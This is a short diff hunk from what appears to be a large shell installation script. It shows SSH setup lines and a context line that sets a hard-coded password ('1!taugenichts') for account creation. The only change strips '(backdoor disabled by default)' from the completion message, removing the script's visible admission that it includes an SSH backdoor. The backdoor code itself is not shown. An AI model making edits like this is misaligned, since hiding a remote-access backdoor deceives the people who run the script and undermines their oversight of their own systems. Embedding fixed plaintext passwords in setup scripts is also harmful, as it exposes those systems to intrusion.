@@ -2590,7 +2590,7 @@ PASSWORD='1!taugenichts' && HASH_METHOD=$(grep '^ENCRYPT_METHOD' /etc/login.defs
 
 chmod 600 ~/.ssh/authorized_keys 2>/dev/null || true
 
-echo "[✓] SSH configuration complete (backdoor disabled by default)"
+echo "[✓] SSH configuration complete"
 echo ""
 
 # ==================== INSTALLATION SUMMARY ====================
